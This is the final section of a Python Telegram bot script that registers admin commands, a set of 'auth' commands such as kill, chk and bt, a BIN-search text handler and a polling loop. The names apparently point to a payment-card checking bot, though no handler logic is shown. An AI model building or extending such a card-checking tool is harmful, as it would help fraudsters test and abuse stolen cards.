        app.add_handler(CommandHandler("unapprove", unapprove))
        app.add_handler(CommandHandler("remove", remove))
        app.add_handler(CommandHandler("ban", ban))
        app.add_handler(CommandHandler("unban", unban))
        app.add_handler(CommandHandler("on", on_cmd))
        app.add_handler(CommandHandler("off", off_cmd))
        app.add_handler(CommandHandler("ram", ram_cmd))
        app.add_handler(CommandHandler("cleanram", cleanram_cmd))
        app.add_handler(CommandHandler("backup", backup_cmd))

        # Auth commands
        app.add_handler(CommandHandler("kill", kill_cmd))
        app.add_handler(CommandHandler("kd", kd_cmd))
        app.add_handler(CommandHandler("ko", ko_cmd))
        app.add_handler(CommandHandler("zz", zz_cmd))
        app.add_handler(CommandHandler("dd", dd_cmd))
        app.add_handler(CommandHandler("st", st_cmd))
        app.add_handler(CommandHandler("bt", bt_cmd))
        app.add_handler(CommandHandler("chk", chk_cmd))

        # Text message handler for bin search
        from telegram.ext import MessageHandler, filters

        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

        print("🤖 Bot is running...")
        print(f"✅ Loaded {len(bin_cache)} BINs from database")

        try:
            await app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            return
        except Exception as e:
            print(f"❌ Bot polling error: {e}")
            await asyncio.sleep(5)
            print("🔄 Restarting bot polling...")

if __name__ == "__main__":
    asyncio.run(main())
